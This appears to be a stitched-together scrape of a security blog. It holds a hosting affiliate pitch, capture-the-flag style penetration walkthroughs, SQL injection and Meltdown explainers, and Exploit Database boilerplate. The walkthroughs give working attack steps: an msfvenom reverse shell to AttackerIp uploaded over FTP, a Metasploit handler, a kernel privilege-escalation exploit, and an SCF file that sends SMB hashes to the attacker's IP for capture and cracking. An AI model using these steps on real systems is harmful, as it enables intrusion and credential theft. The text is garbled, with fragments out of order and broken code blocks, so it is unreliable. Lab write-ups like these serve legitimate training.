Hi Guys,

**Real-Life Experience –**

In the last few months, I have gone through various blogs about the best hosting platform to use for blogging and also for high performance. I even did few polls on every social platform and in 90% of those polls, Siteground was the winner. Although the following factors were truly recommending me Siteground still, I thought of researching more ——

1. **Google suggested – Siteground**
2. **My Research suggested – Siteground**
3. **Social platform polls suggested – Siteground**
4. **My Mind – Take some more time**

Basically, during that time I didn’t have money for buying the least Siteground package so I looked on other platforms where they offer a trial period. Accordingly, I started working on various other platforms to have practical knowledge, and later I figured out that in Siteground also they offer 30 days money-back guarantee where if you cancel your subscription anytime within 30 days then they will refund your money back without any question.

Check it out : [Best for beginners](https://www.siteground.com/go/HacksayanBasic)

Eventually, I purchased a starter pack for one of my clients and structured the blogging site accordingly.

Check it out : [Best for Ecommerce](https://www.siteground.com/go/hacksayanwoocom)

In the next 1-2-3 weeks, I was not getting much traffic. At that time I thought maybe I am a mess !! I researched how to bring traffic and SEO optimization. Everywhere it has been mentioned that it is paid blah blah but when I searched the tool in my hosting platform i.e, in Siteground then I got that for free because all of them come inbuilt in your package. I was really amazed to see that so many tools they are providing categorically as an inbuilt thing with your package.

Check it out : [Best for WP platform](https://www.siteground.com/go/hacksayanwp)

I wish that I can show you how much traffic I was able to grab by doing that but I don’t have my client approval to show the graph.

I recommend to everyone who all are working on various blogging and knowledge sharing platforms or any platforms where you need a hosting plan please try Siteground because as per my experience it’s the best ❤

***Thank You***

It’s almost 4 years I am working in the Cyber Security domain and in this span, I got to know about a few good vulnerabilities while working in various engagements. So I thought of penning it down somewhere as my own repo and that was the main motive behind creating hacksayan.wordpress.com and gradually I thought of migrating from free to paid service 🙂 So I recently migrated [here](https://hacksayan.com) and I will keep updating this blog about my Vulnerability findings as of now and later will see if I can add more.

* **Exploit Workaround :**

1. We tried various ways to crack anything from 80 and 443 port but nothing worked apart from the following gobuster command and we got the username from the text file and collected the default credentials from internet for pf-sense.
   * gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <https://10.10.10.60> -k -x php,txt,confhttps://10.10.10.60/system-users.txt####Support ticket###

     Please create the following user

     **username: Rohit**

     **password: company defaults**

     The default credentials for a pfSense® firewall are: Username: admin. Password: pfsense.

     **Credentials worked : rohit, pfsense**
2. Once we logged in we got to know that the version of **pfsense is 2.1.3**![19-1.png](https://hacksayan.wordpress.com/wp-content/uploads/2020/05/19-1.png?w=636)
3. Next we explored in searchsploit for any known vulnerabilities and we got this.

2. **Port 21:** Check ftp connection with anonymous account. It will work and you will able to see that u can upload and download any file from the remote server using filezilla.

**Steps to Exploit:**

1. Open terminal
2. Type msfconsole (Starting metasploit)
3. Next create the reverse shell using msfvenom :
   * msf > msfvenom –p windows/meterpreter/reverse\_tcp lhost=AttackerIp lport=4444 –f aspx > reversetcpshell.aspx
4. Then transfer your shell.aspx file into victims’ system using Filezilla.

   Access the uploaded file from the web browser.
5. After executing uploaded backdoor file come back to the Metasploit framework and enter the following and wait for the meterpreter session to be created.
   msf> use exploit/multi/handler
   msf> exploit(multi/handler) set payload windows/meterpreter/reverse\_tcp
   msf> exploit(multi/handler) set lhost 10.10.14.6
   msf> exploit(multi/handler) set lport 4444
   msf> exploit(multi/handler) exploit
6. Once the meterpreter session is created type ‘sysinfo’ and see the machine details
7. Then I ran a post exploit “Multi Recon Local Exploit Suggester” that suggests local meterpreter exploits that can be used for the further exploit. After having received a session we can use the **multi/recon/local\_exploit\_suggester** exploit to find candidates for out privilege escalation phase.
   * msf exploit(multi/handler) > use post/multi/recon/local\_exploit\_suggester
   * msf post(multi/recon/local\_exploit\_suggester) > options
   * msf post(multi/recon/local\_exploit\_suggester) > set session 1
   * msf post(multi/recon/local\_exploit\_suggester) > exploit
8. **Wonderful!!** Exploit Suggester truly proof itself by suggesting another exploit name to which target is vulnerable. So now we will go with the last option as highlighted in the image.
9. Looks like we have more than a handful to try. I tried the first one on my own and couldn’t get it to work. So we can move on the the second one, ms10\_015\_kitrap0d. Looking on Microsoft’s security bulletin, ms10\_015 is a kernel bug that allows users to run arbitrary code in kernel mode. You can read more about it [here](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-015?source=post_page---------------------------).

   Let’s continue exploit the machine by loading up our priv esc exploit in metasploit.
10. Try these :
    * msf post(multi/recon/local\_exploit\_suggester) > use exploit/windows/local/ms10\_05\_kitrap0d
    * msf exploit(windows/local/ms10\_05\_kitrap0d) > show options
    * msf exploit(windows/local/ms10\_05\_kitrap0d) > set session 1
    * msf exploit(windows/local/ms10\_05\_kitrap0d) > run
11. If you get the shell search for root.txt and user.txt.

# Sizzle - Windows Os
# Date: 25.07.2019

Quick Summary

Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an smb share, a simple scf file attack with responder and john could give me a password for a user. With that password I could generate a certificate request and get a certificate then a WinRm session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is 10.10.10.103, I added it to /etc/hosts as sizzle.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC sizzle.htb Full Output :
```

We got a lot of ports, we got ftp on port 21, dns on port 53, http on port 80, smb and ldap. We also see that the domain is HTB.LOCAL and commonName is sizzle.htb.local, so I added it to /etc/hosts : ![](https://0xrick.github.io/images/hackthebox/sizzle/3.png) anonymous authentication on ftp was allowed but there was nothing there so I will skip that. HTTP I checked that http server and the index only had a simple gif. So I ran gobuster : =====================================================

===================================================== /certenroll sounds interesting, but unfortunately it’s a 403 It’s time to check smb . SMB, SCF File Attack, amanda’s Credentials First thing we need to know is the shares, we can use smbclient to list the shares : smbclient --list //sizzle.htb/ -U "" I noticed that there was a share for Active Directory Certificate Services. Most likely /certsrv will be on the web server . Try http://sizzle.htb/certsrv Yes it was there, and we need credentials. Back to smb the only share I could access anonymously was Department Shares smbclient --list //sizzle.htb/"Department Shares" -U "" It had a lot of directories, I could write to 2 of them : ZZ_ARCHIVE and Users/Public. We are looking for credentials. Since we can write to one of the directories then we can possibly apply an scf file attack. You can read about it [here](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/). We are going to put an scf file in Users/Public. It looks like this : #cat @hacksayan.scf [Shell]
Command=2
IconFile=\\10.10.xx.xx(my ip)\share\hacksayan.ico
[Taskbar]
Command=ToggleDesktop Then we will run responder. Whenever a user browses that directory he will automatically try to connect to my box through smb, that’s when responder catches the hashes. Then go to \Users\Public and place the scf file smb: \Users\Public\> put @hacksayan.scf Then turn on the responder. root@kali:~# responder -wrf --lm -v -I tun0 responder caught hash for a user called amanda. Let’s crack it with john : root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt amanda.hash The password is Ashare1972 Requesting a Certificate, WinRm Session as amanda I tried to access certenroll as amanda and it worked fine : smbclient //sizzle.htb/certenroll -U amanda So I went to /certsrv and used amanda’s credentials to authenticate Now it’s time to get a certificate. But wait a second, what’s the certificate for anyway ? A full nmap scan shows that WinRm ports are open : nmap -p- -T5 -vvv --max-retries 1 sizzle.htb Full Output :

Port 5985 uses http while 5986 uses https. When I got amanda’s credentials I tried to connect to port 5985 and I couldn’t, So we will do it through port 5986 that’s why we need a certificate. (If you don’t know how to connect through WinRm, we’ll get to that later.) We will generate a certificate request and a private key : openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr Then we will submit an advanced certificate request on the portal which we got after authenticating amanda in /certserv through smbclient. Paste our request and download the certificate (base64 encoded) Now we can use WinRm, but what’s WinRm ?
```

Windows Remote Management (WinRM) is the Microsoft implementation of [WS-Management Protocol](https://docs.microsoft.com/en-us/windows/desktop/winrm/ws-management-protocol), a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems, from different vendors, to interoperate. The WS-Management protocol specification provides a common way for systems to access and exchange management information across an IT infrastructure. WinRM and [*Intelligent Platform Management Interface (IPMI)*](https://docs.microsoft.com/en-us/windows/desktop/winrm/windows-remote-management-glossary), along with the [Event Collector](https://go.microsoft.com/fwlink/p/?linkid=84396) are components of the [Windows Hardware Management](https://go.microsoft.com/fwlink/p/?linkid=45204) features. –[Microsoft](https://docs.microsoft.com/en-us/windows/desktop/winrm/portal)

```
WinRm is not meant to be used from Linux but luckily there’s a [Ruby library](https://github.com/WinRb/WinRM) for it. That’s how we will connect. I used [Alamot’s shell](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) and added some stuff for the cert and the key : # cat winrm.rb #!/usr/bin/ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  client_cert: '/root/Desktop/HTB/boxes/sizzle/certs/certnew.cer',
  client_key: '/root/Desktop/HTB/boxes/sizzle/certs/request.key',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end And it worked : # ./winrm.rb
```

## [SQL Injection Fundamentals](https://hacksayan.wordpress.com/2018/04/16/sql-injection-fundamentals/)

[April 16, 2018](https://hacksayan.wordpress.com/2018/04/16/sql-injection-fundamentals/)[hacksayan](https://hacksayan.wordpress.com/author/hacksayan/)[Leave a comment](https://hacksayan.wordpress.com/2018/04/16/sql-injection-fundamentals/#respond)

## **Definition** :

SQL Injection (SQLi) refers to an injection attack wherein an attacker can execute malicious SQL statements (also commonly referred to as a malicious *payload*) that control a web application’s database server (also commonly referred to as a *Relational Database Management System – RDBMS*).

## **Types of SQL Injection (SQLi)** **:**

SQL Injection can be classified into three major categories –

1. *In-band SQLi*
2. *Inferential SQLi*
3. *Out-of-band SQLi*

### ***1.*** ***In-band SQLi*** ***:***

In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results.

The two most common types of in-band SQL Injection are *Error-based SQLi* and *Union-based SQLi*.

* #### **Error-based SQLi**

Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database. While errors are very useful during the development phase of a web application, they should be disabled on a live site, or logged to a file with restricted access instead.

* #### **Union-based SQLi**

Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.

### ***2.** **Inferential SQLi (Blind SQLi)** **:***

Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server.

The two types of inferential SQL Injection are *Blind-boolean-based SQLi* and *Blind-time-based SQLi*.

* #### **Boolean-based (content-based) Blind SQLi**

Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result.

Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned. This attack is typically slow (especially on large databases) since an attacker would need to enumerate a database, character by character.

* **Time-based Blind SQLi**

Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE.

Depending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned. This attack is typically slow (especially on large databases) since an attacker would need to enumerate a database character by character.

### ***3.*** ***Out-of-band SQLi***

Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results.

Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).

Out-of-band SQLi techniques would rely on the database server’s ability to make DNS or HTTP requests to deliver data to an attacker. Such is the case with Microsoft SQL Server’s `xp_dirtree` command, which can be used to make DNS requests to a server an attacker controls; as well as Oracle Database’s UTL\_HTTP package, which can be used to send HTTP requests from SQL and PL/SQL to a server an attacker controls.

## [Oops !! WTF is Meltdown & Spectre Vulnerability ?](https://hacksayan.wordpress.com/2018/03/22/oops-wtf-is-meltdown-spectre-vulnerability/)

[March 22, 2018](https://hacksayan.wordpress.com/2018/03/22/oops-wtf-is-meltdown-spectre-vulnerability/)[hacksayan](https://hacksayan.wordpress.com/author/hacksayan/)[Leave a comment](https://hacksayan.wordpress.com/2018/03/22/oops-wtf-is-meltdown-spectre-vulnerability/#respond)

Meltdown is a cache-timing attack on Intel CPUs that allows all memory to be read by any process because of how they do Speculative Execution. If that sounds like a handful, we wrote this blog for you!

This post includes *everything you must know* before you can understand Meltdown as a developer (it assumes no knowledge of CPU internals). I highly recommend reading the original paper alongside this from <https://meltdownattack.com/meltdown.pdf>, I found it to be very readable and extremely well written.

***Out of Order / Speculative Execution***

Modern CPUs do out-of-order execution whenever they see a branch (if/switch etc). They will typically execute code for multiple branches while the conditional is evaluated. So

*if (a+b\*c == d)*

*{*

*// first branch*

*}*

*else {*

*// second branch*

*}*

will involve both the conditions running simultaneously while the condition is evaluated. Once the CPU has the answer (say “true”), it scraps the work from the second branch and commits the first branch. The instructions that are executed out-of-order are called “transient instructions” till they are committed.

***The Bug***

The code in both the branches can do a lot of things. The assumption is that all of these things will be rolled back once a branch is picked. The attack is possible because cache-state is something that does not seem to be rolled back. This is the crux behind both Meltdown and Spectre attacks.

Meltdown specifically works because “any-random-memory-access” seems to work while in a transient instruction. This attack allows a program to access the memory, and thus also the secrets, of other programs and the operating system.

***CPU Cache?***

Reading data from RAM is slow when you are a CPU. CPU cache times are in the order of 1-10ns, while RAM access takes >100ns. Almost any memory read/write is placed in the cache: The cache is a mirror image of memory activity on the computer.

***Cache Timing?***

Let us say I have this piece of code:

$secrets = [“secret1”, “secret2”, “secret3”, “secret4”, “realSecret”];

$realSecret = $secrets[4];

This loads the real secret in memory. An attacker then does the following:

1. Clear the CPU cache
2. Runs the above program
3. Try to access the specific memory address

The above access results in an error, and raises an exception. However, the attacker knows that the secret is in one of the 5 possible locations. Since only one of these is ever read by the actual program, it can repeatedly run the program and time the exception to figure out which one of the locations was being read. The one which is being read is cached, and the exception will be raised much faster as a result.

Cache Timing attacks are the building blocks of Meltdown, which uses them as a side channel to leak data.

***The Bug, again***

Now that we’ve explained cache-timing attacks (which can tell you “what-memory” is being used by another program), we can get back to Meltdown. Meltdown happens because:

* CPUs do not rollback CPU-cache after speculative execution, and
* You can manipulate the cache in those transient instructions to create a “side-channel” and
* **Intel CPUs allow you to read memory from other processes while in a transient instruction.**

From the paper:

Meltdown consists of 3 steps:

**Step 1.** The content of an attacker-chosen memory location, which is inaccessible to the attacker, is loaded into a register.

**Step 2.** A transient instruction accesses a cache line based on the secret content of the register.

**Step 3.** The attacker uses Flush+Reload to determine the accessed cache line and hence the secret stored at the chosen memory location.

In slightly more easy words:

1. Read an inaccessible memory address (this will raise an exception, but we’ll work later on suppressing this)
2. Depending on the value of the byte at the read address, read a specific value from a known memory location. Do this before the exception is raised, relying on Speculative Execution.
3. Use a cache-timing attack to see what value was read in 2, and use that to infer the value you wanted to read

   The trick is in executing Step 2 as a transient instruction, which lets us read any memory address, even from another process

In code:

c = \*kernel\_memory\_address;

b = probe[c];

There are several caveats:

***Exception Suppressing***

If you try to actually read kernel-space memory directly, your program will crash. Meltdown works around this by making sure that the memory is only read in transient instructions that will be rolled back.

So you wrap the above code with:

if (check\_function()) {

meltdown();

}

And make sure that check\_function always returns false. What happens is that the CPU starts running the code inside meltdown function before it has the result from the check.

***Cache Lines***

CPU cache are broken down into several cache-lines. Think of them as lookup hashes for your CPU cache. Instead of accessing single-byte (probe[c]), meltdown multiples the memory addresses by 4096 to make sure that the code accessess a specific cache line. So more like:

b = probe[c \* 4096];

If you’re wondering why we are doing a read instead of just printing c, or maybe copying it to another place, it is because CPU designers considered that, and rollback those instructions correctly, so any writes cannot be used to exfiltrate the data from a transient instruction.

***Zeroes***

Sometimes, the exception is raised before the code executes, and the value of c is set to 0 as part of the rollback. This makes the attack unreliable. So, the attack decides to ignore zero-value-reads and only prime the cache if it reads a non-zero value. Thus the whole code becomes

*if (check\_function()) {*

*label retry:*

*c = \*kernel\_memory\_address;*

*if (c != 0)*

*b = probe[c \* 4096];*

*else*

*goto retry;*

*}*

The similar assembly code (from the paper) is:

; rcx = kernel address

; rbx = probe array

retry:

mov al, byte [rcx] ; try to read rcx

shl rax, 0xc ; multiply the read value with 4096 by shifting left 12(0xc) bits

jz retry ; retry if the above is zero

mov rbx, qword [rbx + rax] ; read specific entry in rbx

The special condition where c actually is zero is handled in the cache-timing where we notice no memory address has been cached and decide it was a zero.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
